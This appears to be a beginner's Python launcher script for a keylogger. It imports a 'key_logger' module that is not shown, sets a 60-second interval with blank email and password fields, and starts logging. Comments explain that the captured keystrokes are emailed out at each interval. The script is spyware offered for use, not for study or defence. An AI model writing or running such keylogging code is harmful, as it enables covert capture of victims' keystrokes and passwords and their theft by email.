#!/usr/bin/env python

import key_logger                           #importing the keylogger file that contains the main code in class. this called as library in general
                                            #library is nothting but a file that contains the main function that needs to be executed.

my_keylogger= key_logger.Keylogger(60, "", "")        #creating an object my_keylogger that holds the instance of the class Keylogger from key_logger(library) file.
                            #enter the time interval to generate mail.(time_interval, "email_id", "password"
my_keylogger.start()                                                                #object calling the method start that is defined within the Keylogger class.